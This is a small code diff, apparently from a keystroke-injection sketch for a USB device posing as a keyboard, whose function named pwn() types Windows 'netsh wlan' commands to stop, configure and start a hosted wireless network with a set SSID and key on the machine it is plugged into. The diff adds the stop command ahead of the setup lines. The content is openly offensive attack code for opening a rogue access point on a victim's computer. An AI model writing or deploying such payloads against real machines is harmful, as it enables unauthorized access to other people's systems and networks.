@@ -49,6 +49,8 @@ void pwn()
  delay(500);
  key(KEY_ENTER, 0);
  delay(1100);
+ Keyboard.println("netsh wlan stop hostednetwork");
+ delay(150);
  Keyboard.println("netsh wlan set hostednetwork mode=allow ssid=ESSID key=PASSWORD");
  delay(150);
  Keyboard.println("netsh wlan start hostednetwork");
